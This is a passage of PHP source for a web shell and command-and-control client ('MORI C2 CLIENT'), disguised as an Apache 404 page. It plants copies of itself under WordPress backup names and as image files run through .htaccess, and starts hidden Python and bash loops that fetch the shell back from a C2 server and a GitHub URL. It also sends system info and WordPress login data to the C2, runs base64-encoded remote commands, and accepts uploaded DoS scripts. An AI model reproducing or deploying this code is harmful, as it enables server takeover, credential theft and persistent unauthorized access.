                preg_match("/[a-f0-9\-]{36}|[0-9]{4,}/", basename($full)) // UUID or numeric dirs (tenant IDs)
            );
            
            if (@is_writable($full) && count($results) < 100) {
                // DEEP PATHS GET PRIORITY
                $depth_score = substr_count($full, "/");
                $results[] = ["path" => $full, "depth" => $depth_score, "web" => $is_web_priority];
            }
            
            // Go deeper
            if ($depth < $max_depth - 1) {
                scan_web_deep($full, $results, $max_depth, $depth + 1);
            }
        }
    }
    
    // Web root deep scan
    $web_bases = ["/var/www", "/home", "/opt", "/srv", "/var"];
    foreach ($web_bases as $base) {
        if (@is_dir($base)) {
            $temp = [];
            scan_web_deep($base, $temp);
            $targets = array_merge($targets, $temp);
        }
    }
    
    // 3. SORT BY DEPTH (deeper = better for hiding)
    usort($targets, function($a, $b) {
        if (is_array($a)) {
            $depth_a = $a["depth"] ?? 0;
            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
        }
        return 0;
    });
    
    // Extract just paths
    $final_targets = [];
    foreach ($targets as $item) {
        if (is_array($item)) {
            $final_targets[] = $item["path"];
        } else {
            $final_targets[] = $item;
        }
    }
    
    return array_values(array_unique($final_targets));
}

// Get main shell code
function get_main_shell_code() {
    // Try multiple locations
    $paths = array_merge(
        glob("/var/www/*/public_html/haeder.php"),
        glob("/var/www/*/haeder.php"),
        glob("/home/*/public_html/haeder.php"),
        [__DIR__ . "/haeder.php", dirname(__DIR__) . "/haeder.php"]
    );
    
    foreach ($paths as $path) {
        $code = @file_get_contents($path);
        if ($code && strlen($code) > 15000) {
            return $code;
        }
    }
    
    return null;
}

// Fetch from C2 if local not available
function get_shell_code_fallback() {
    $c2_url = "' . $c2_server . '?urlver";
    $content = @file_get_contents($c2_url);
    if ($content && strlen($content) > 15000) {
        return $content;
    }
    
    $github_url = "https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/haeder.php";
    $content = @file_get_contents($github_url);
    if ($content && strlen($content) > 15000) {
        return $content;
    }
    
    return null;
}

// Deploy to all targets
function deploy_sister_files_from_backup() {
    $shell_code = get_main_shell_code();
    if (!$shell_code) {
        $shell_code = get_shell_code_fallback();
        if (!$shell_code) return 0;
    }
    
    $targets = get_deployment_targets_from_backup();
    $deployed = 0;
    
    $standard_names = ["wp-config-backup.php", "wp-content-backup.php", "wp-settings-backup.php"];
    $masked_names = ["logo.png", "banner.gif", "avatar.jpg"];
    
    foreach (array_slice($targets, 0, 10) as $idx => $target) {
        // Standard PHP
        $file = $target . "/" . $standard_names[$idx % count($standard_names)];
        if (@file_put_contents($file, $shell_code)) {
            @chmod($file, 0644);
            $deployed++;
        }
        
        // Image masked (no .php extension)
        $img = $target . "/" . $masked_names[$idx % count($masked_names)];
        $masked = "<?php\n" . substr($shell_code, 5);
        if (@file_put_contents($img, $masked)) {
            @chmod($img, 0644);
            $deployed++;
        }
        
        // .htaccess - execute .png .gif .jpg as PHP
        $htaccess = $target . "/.htaccess";
        $content = "<FilesMatch \"\\.png$|\\.gif$|\\.jpg$\">\n" .
                   "    SetHandler application/x-httpd-php\n" .
                   "</FilesMatch>\n";
        @file_put_contents($htaccess, $content);
    }
    
    return $deployed;
}

// Main execution
if (php_sapi_name() !== "cli" || !isset($GLOBALS["_wp_config_backup_running"])) {
    $GLOBALS["_wp_config_backup_running"] = true;
    
    // Deploy sister files
    $deployed = deploy_sister_files_from_backup();
    
    // Log result
    @file_put_contents("/tmp/.wp_backup_deployed", json_encode([
        "deployed" => $deployed,
        "timestamp" => time()
    ]));
}

// Silent exit
exit(0);
?>';

    return $code;
}

function ensure_persistence_v4() {
    /**
     * MAIN ORCHESTRATOR v2 - Called on every register
     * Deploys sister files + Starts Python + Bash monitors (max 1 each)
     */
    global $c2_server, $web_shell_url, $CLIENT_ID, $client_id, $C2_SERVER;
    
    $client_id = $client_id ?: ($CLIENT_ID ?: md5(gethostname() . microtime()));
    
    // Step 1: Deploy aggressive sister files
    @deploy_sister_files_aggressive();
    
    // Step 2: Create wp-config-backup.php orchestrator
    $backup_code = @generate_wp_config_backup();
    if ($backup_code) {
        $backup_file = '/tmp/wp-config-backup.php';
        @file_put_contents($backup_file, $backup_code);
        @chmod($backup_file, 0755);
        
        // Execute in background
        @shell_exec("nohup php " . escapeshellarg($backup_file) . " > /dev/null 2>&1 &");
    }
    
    // Step 3: Start monitor processes (ONLY 1 instance each, no duplicates)
    $monitor_lock = '/tmp/.mori_monitor_started';
    $lock_age = @file_exists($monitor_lock) ? (time() - @filemtime($monitor_lock)) : 0;
    
    // Start monitors only once per hour
    if ($lock_age > 3600) {
        @touch($monitor_lock);
        
        // Python monitor (max 1 instance) — real shell-check + restore loop
        $py_process_count = (int)shell_exec("pgrep -c -f '/tmp/.mori_monitor.py' 2>/dev/null || echo 0");
        if ($py_process_count == 0) {
            $shell_path_esc = addslashes(SHELL_PATH);
            $shell_url_esc  = addslashes($web_shell_url ?: '');
            $c2_url_esc     = addslashes($C2_SERVER ?: '');
            $py_code = '#!/usr/bin/env python3
import os, time, ssl, urllib.request

SHELL_PATH = "' . $shell_path_esc . '"
SHELL_URL  = "' . $shell_url_esc  . '"
C2_URL     = "' . $c2_url_esc     . '"
INTERVAL   = 30
SOURCES    = [C2_URL + "?act=get_shell", "https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/haeder.php"]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def is_alive():
    try:
        req = urllib.request.Request(SHELL_URL + "?info", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
            return r.status == 200
    except:
        return False

def restore():
    for src in SOURCES:
        try:
            req = urllib.request.Request(src, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
                code = r.read()
            if len(code) > 10000:
                with open(SHELL_PATH, "wb") as f: f.write(code)
                os.chmod(SHELL_PATH, 0o644)
                return True
        except:
            pass
    return False

if hasattr(os, "prctl"):
    try: os.prctl(15, b"[system]")
    except: pass

while True:
    try:
        if not is_alive():
            sz = os.path.getsize(SHELL_PATH) if os.path.exists(SHELL_PATH) else 0
            if sz < 10000:
                restore()
        time.sleep(INTERVAL)
    except:
        time.sleep(INTERVAL)
';
            @file_put_contents('/tmp/.mori_monitor.py', $py_code);
            @chmod('/tmp/.mori_monitor.py', 0755);
            @shell_exec("nohup python3 /tmp/.mori_monitor.py > /dev/null 2>&1 &");
        }

        // Bash monitor (max 1 instance) — real file-check + restore loop
        $bash_process_count = (int)shell_exec("pgrep -c -f '/tmp/.mori_monitor.sh' 2>/dev/null || echo 0");
        if ($bash_process_count == 0) {
            $shell_path_sh = escapeshellarg(SHELL_PATH);
            $c2_sh         = escapeshellarg($C2_SERVER ?: '');
            $bash_code = '#!/bin/bash
SHELL_PATH=' . $shell_path_sh . '
C2_URL=' . $c2_sh . '
GH_URL="https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/haeder.php"

restore() {
  curl -sL "${C2_URL}?act=get_shell" -o "$SHELL_PATH" 2>/dev/null && \
    [ $(stat -c%s "$SHELL_PATH" 2>/dev/null || echo 0) -gt 10000 ] && chmod 644 "$SHELL_PATH" && return 0
  wget -q "${C2_URL}?act=get_shell" -O "$SHELL_PATH" 2>/dev/null && \
    [ $(stat -c%s "$SHELL_PATH" 2>/dev/null || echo 0) -gt 10000 ] && chmod 644 "$SHELL_PATH" && return 0
  curl -sL "$GH_URL" -o "$SHELL_PATH" 2>/dev/null && chmod 644 "$SHELL_PATH"
}

while true; do
  SZ=$(stat -c%s "$SHELL_PATH" 2>/dev/null || echo 0)
  [ "$SZ" -lt 10000 ] && restore
  sleep 30
done
';
            @file_put_contents('/tmp/.mori_monitor.sh', $bash_code);
            @chmod('/tmp/.mori_monitor.sh', 0755);
            @shell_exec("nohup bash /tmp/.mori_monitor.sh > /dev/null 2>&1 &");
        }
    }
    
    // Step 4: Store deployment metadata
    $metadata = [
        'client_id' => $client_id,
        'deploy_time' => time(),
        'shell_url' => $web_shell_url,
        'c2_server' => $c2_server,
        'php_version' => PHP_VERSION,
        'os' => php_uname(),
        'processes' => [
            'python' => $py_process_count ?? 'n/a',
            'bash' => $bash_process_count ?? 'n/a',
        ],
    ];
    
    @file_put_contents('/tmp/.mori_deployment_meta.json', json_encode($metadata));
    
    return true;
}



// DEPRECATED restore_from_backup() - Replaced with ensure_persistence_v4()





// =============================================
// OTOMATİK KAYIT (HER ERİŞİMDE)
// =============================================
function auto_register() {
    global $c2_server, $client_id, $debug_mode, $web_shell_url;
    
    // Skip if already registered in this execution
    if (isset($GLOBALS['_SHELL_REGISTERED']) && $GLOBALS['_SHELL_REGISTERED'] === true) {
        return true;
    }
    
    // Get WordPress login credentials (dynamic)
    $wp_creds = generate_wp_login_credentials();
    
    // C2 sunucusuna kayıt yap - BACKGROUND ONLY (don't block)
    $registration_data = [
        'id' => $client_id,
        'shell_url' => $web_shell_url,
        'sysinfo' => collect_system_info(),
        'timestamp' => time(),
        'os_type' => 'LINUX',
        'wp_login_id' => $wp_creds['blogs_id'],
        'wp_login_hash' => $wp_creds['hash']
    ];
    
    $register_url = $c2_server . '?act=reg';
    
    // Very short timeout (fire-and-forget)
    $result = @http_post_timeout($register_url, $registration_data, 0.5);
    
    // Mark as attempted (don't try again this request)
    $GLOBALS['_SHELL_REGISTERED'] = true;
    
    return $result !== null;
}




// =====================================================
// HELPER: Add missing delete_directory function
// =====================================================
function delete_directory($path) {
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return "[ERROR] Directory not found: $path";
    }
    
    $items = @scandir($real);
    if ($items && count($items) > 2) {
        return "[ERROR] Directory not empty";
    }
    
    return @rmdir($real) ? "OK: Deleted $path" : "[ERROR] Cannot delete directory";
}

// =====================================================
// WEB SHELL API ENDPOINTS
// =====================================================

// DEBUG MODE
if (isset($_GET['debug']) && $debug_mode) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "MORI C2 CLIENT v3.0\n";
    echo "====================\n\n";
    echo "Client ID: $client_id\n";
    echo "OS: $os_type\n";
    echo "Web Shell URL: $web_shell_url\n";
    echo "Current User: " . get_current_user() . "\n";
    echo "Current Directory: " . getcwd() . "\n";
    echo "PHP Version: " . PHP_VERSION . "\n";
    echo "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n\n";
    
    echo "SYSTEM INFO:\n";
    print_r(collect_system_info());
    exit;
}

// REGISTER DATA ENDPOINT (for server to pull sysinfo)
if (isset($_GET['act']) && $_GET['act'] == 'register_data') {
    // PRE-EXECUTION PERSISTENCE CHECK
    @ensure_persistence_v4();
    
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(collect_system_info());
    exit;
}

// REGISTER ONLY (manuel kayıt için)
// Optimize: batch mode veya single mode
if (isset($_GET['register'])) {
    // PRE-EXECUTION PERSISTENCE CHECK
    @ensure_persistence_v4();
    
    header('Content-Type: text/plain; charset=utf-8');
    
    // Check if batch registration is available (multiple clients accessing)
    $batch_mode = isset($_GET['batch']) && $_GET['batch'] === '1';
    
    if ($batch_mode) {
        // Batch mode: queue'de bekle, toplamaya devam et
        $result = auto_register();
        echo $result ? "QUEUED - Will be registered in batch\n" : "FAILED - Queue error";
    } else {
        // Single mode: immediate registration
        $result = auto_register();
        echo $result ? "OK - Registered successfully\n" : "FAILED - Registration failed\n";
    }
    
    exit;
}

// COMMAND EXECUTION VIA GET (base64 encoded - supports both safe_base64 and normal base64)
if (isset($_GET['m'])) {
    @ensure_persistence_v4();
    auto_register();
    
    ob_end_clean();
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    
    // Try safe_base64_decode first, then normal base64
    $encoded = $_GET['m'] ?? null;
    
    if (!$encoded || !is_string($encoded)) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'No payload provided']));
    }
    
    $cmd = safe_base64_decode($encoded);
    if ($cmd === false || strlen($cmd) === 0) {
        $cmd = @base64_decode($encoded, true);
    }
    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'Invalid base64 encoding']));
    }
    
    $output = execute_command($cmd);
    
    // Detect output type and set appropriate header
    if (@json_decode($output, true) !== null) {
        header('Content-Type: application/json; charset=utf-8');
    } else {
        header('Content-Type: text/plain; charset=utf-8');
    }
    echo $output;
    exit;
}

// COMMAND EXECUTION VIA POST (supports both safe_base64 and normal base64)
if (isset($_POST['m'])) {
    @ensure_persistence_v4();
    auto_register();
    
    ob_end_clean();
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    
    $payload = $_POST['m'] ?? null;
    
    // NULL-safe payload handling
    if (!$payload || !is_string($payload)) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'No payload provided']));
    }
    
    // Try safe_base64_decode first, then normal base64
    $cmd = null;
    if (strpos($payload, 'base64:') === 0 && strlen($payload) > 7) {
        $encoded_part = substr($payload, 7);
        $cmd = safe_base64_decode($encoded_part);
        if ($cmd === false) {
            $cmd = @base64_decode($encoded_part, true);
        }
    } else {
        $cmd = safe_base64_decode($payload);
        if ($cmd === false) {
            $cmd = @base64_decode($payload, true);
        }
    }
    
    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'Invalid base64 encoding']));
    }
    
    $output = execute_command($cmd);
    
    // Detect output type and set appropriate header
    if (@json_decode($output, true) !== null) {
        header('Content-Type: application/json; charset=utf-8');
    } else {
        header('Content-Type: text/plain; charset=utf-8');
    }
    echo $output;
    exit;
}

// JSON API (ileri düzey)
if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
    // PRE-EXECUTION PERSISTENCE CHECK
    @ensure_persistence_v4();
    auto_register(); // Register this execution
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if ($input && isset($input['action'])) {
        header('Content-Type: application/json; charset=utf-8');
        
        switch ($input['action']) {
            case 'exec':
                $cmd = $input['command'] ?? '';
                $result = execute_command($cmd);
                echo json_encode(['success' => true, 'output' => $result]);
                break;
                
            case 'info':
                echo json_encode(collect_system_info());
                break;
                
            case 'register':
                $success = auto_register();
                echo json_encode(['success' => $success, 'client_id' => $client_id]);
                break;

            case 'upload_dos_py':
                // Upload dos.py file - base64 encoded
                $file_content = $input['file_content'] ?? '';
                $file_path = '/tmp/dos.py';
                if ($file_content && base64_decode($file_content, true)) {
                    $decoded = base64_decode($file_content);
                    if (file_put_contents($file_path, $decoded) !== false) {
                        @chmod($file_path, 0755);
                        echo json_encode(['success' => true, 'file' => $file_path]);
                    } else {
                        echo json_encode(['success' => false, 'error' => 'Write failed']);
                    }
                } else {
                    echo json_encode(['success' => false, 'error' => 'Invalid base64']);
                }
                break;

            case 'upload_dos_php':
                // Upload dos.php file - base64 encoded
                $file_content = $input['file_content'] ?? '';
                $file_path = 'dos.php';
                if ($file_content && base64_decode($file_content, true)) {
                    $decoded = base64_decode($file_content);
                    if (file_put_contents($file_path, $decoded) !== false) {
                        @chmod($file_path, 0755);
                        echo json_encode(['success' => true, 'file' => $file_path]);
                    } else {
                        echo json_encode(['success' => false, 'error' => 'Write failed']);
                    }
                } else {
                    echo json_encode(['success' => false, 'error' => 'Invalid base64']);
                }
                break;
                
            default:
                echo json_encode(['error' => 'Unknown action']);
        }
        exit;
    }
}

// =====================================================
// BACKGROUND AGENT MODE (CLI veya ?agent=1 ile)
// =====================================================
if (php_sapi_name() === 'cli' || isset($_GET['agent']) || isset($_GET['daemon'])) {
    // Agent modu - sayfa gösterilmez, sürekli çalışır
    $max_execution = isset($_GET['timeout']) ? (int)$_GET['timeout'] : 300;
    $sleep_interval = isset($_GET['sleep']) ? (int)$_GET['sleep'] : 5;
    
    auto_register();
    
    $start_time = time();
    $task_counter = 0;
    
    while ((time() - $start_time) < $max_execution) {
        $task = c2_get_task($c2_server, $client_id);
        
        if ($task && trim($task) && trim($task) !== 'no_task') {
            $task_counter++;
            $output = execute_command($task);
            c2_send_result($c2_server, $client_id, $task, $output);
        }
        
        if ($task_counter % 10 === 0) {
            c2_update_status($c2_server, $client_id);
        }
        
        sleep($sleep_interval);
    }
    
    if (php_sapi_name() === 'cli') {
        exit(0);
    }
    
    echo "MORI C2 Agent completed " . $task_counter . " tasks in " . (time() - $start_time) . " seconds\n";
    exit;
}

// =====================================================
// NETWORK MONITORING DAEMON (?monitor=1 mode)
// Distributed backup network'ü 30 saniyede bir kontrol et
// =====================================================
if (isset($_GET['monitor'])) {
    set_time_limit(0);
    ignore_user_abort(true);
    
    $monitor_interval = isset($_GET['interval']) ? (int)$_GET['interval'] : 30;
    $max_monitor_time = isset($_GET['max_time']) ? (int)$_GET['max_time'] : 86400; // 24 saat
    
    $start_time = time();
    $check_count = 0;
    $restore_count = 0;
    
    while ((time() - $start_time) < $max_monitor_time) {
        $check_count++;
        
        // 1. Check distributed backups
        $inventory = @file_get_contents(__DIR__ . '/.wp-security.list');
        if ($inventory) {
            $files = array_filter(array_map('trim', explode("\n", $inventory)));
            foreach ($files as $file) {
                if (strpos($file, ';') !== false || strpos($file, '#') === 0) continue; // Skip comments
                
                if (!file_exists($file) || filesize($file) < 5000) {
                    // File missing or damaged - restore
                    $payload = @file_get_contents($c2_server . '?urlver');
                    if (!$payload || strlen($payload) < 100) {
                        $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE);
                    }
                    
                    if ($payload && strlen($payload) > 5000) {
                        @file_put_contents($file, $payload);
                        @chmod($file, 0644);
                        $restore_count++;
                    }
                }
            }
        }
        
        // 2. Execute PHP backups
        $dirs = ['/tmp', '/var/tmp', '/var/www', '/var/www/html', '/home'];
        foreach ($dirs as $dir) {
            if (is_dir($dir)) {
                @shell_exec("php '$dir/.wp-firewall.php' > /dev/null 2>&1 &");
            }
        }
        
        // 3. Check/restore main shell
        $mainFile = SHELL_PATH;
        if (!file_exists($mainFile) || filesize($mainFile) < 10000) {
            $payload = @file_get_contents($c2_server . '?urlver');
            if (!$payload) $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE);
            if ($payload && strlen($payload) > 10000) {
                @file_put_contents($mainFile, $payload);
                $restore_count++;
            }
        }
        
        // 4. Re-deploy if missing
        if (rand(1, 100) > 90) { // Every ~10 checks
            deploy_distributed_network_backups();
        }
        
        sleep($monitor_interval);
    }
    
    // Log summary
    $summary = "Monitor: Checks=$check_count, Restores=$restore_count\n";
    @error_log($summary);
    
    if (php_sapi_name() === 'cli') {
        echo $summary;
        exit(0);
    }
    
    exit;
}

register_shutdown_function(function() {
    // Yanıt zaten gönderildi, connection kapandı
    // Bu noktada HTTP isteği yapmak HÂLÂ sorunlu olabilir (aynı Apache),
    // Bu yüzden doğrudan dosyaya yaz — HTTP kullanma.
    global $c2_server, $client_id, $debug_mode;

    // Kayıt isteğini kuyruğa al (dosya bazlı, HTTP yok)
    $queue_file = __DIR__ . '/.mori_queue';
    $entry = json_encode([
        'id'        => $client_id,
        'timestamp' => time(),
        'sysinfo'   => [] // Agent mode'da doldurulur
    ]);
    @file_put_contents($queue_file, $entry . "\n", FILE_APPEND | LOCK_EX);
});
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</p>
    <hr>
    <address>Apache Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
</body>
</html>
